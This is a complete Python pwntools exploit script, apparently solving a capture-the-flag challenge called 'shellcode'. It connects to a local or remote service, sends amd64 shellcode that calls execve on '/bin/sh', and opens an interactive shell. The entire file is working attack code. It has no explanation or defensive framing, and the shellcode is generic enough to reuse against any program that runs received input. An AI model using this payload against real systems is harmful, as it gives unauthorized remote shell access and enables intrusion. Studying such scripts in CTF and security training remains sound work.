#!/usr/bin/env python3

from pwn import *

exe = ELF("./shellcode")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 13775)

    return r


context.binary = exe
def main():
    r = conn()
    shellcode = asm(
        '''
        mov rax, 0x3b
        mov rdi, 29400045130965551
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx

        syscall
        ''', arch='amd64'
        )
    r.sendline(shellcode)
    pause()
    r.interactive()

if __name__ == "__main__":
    main()
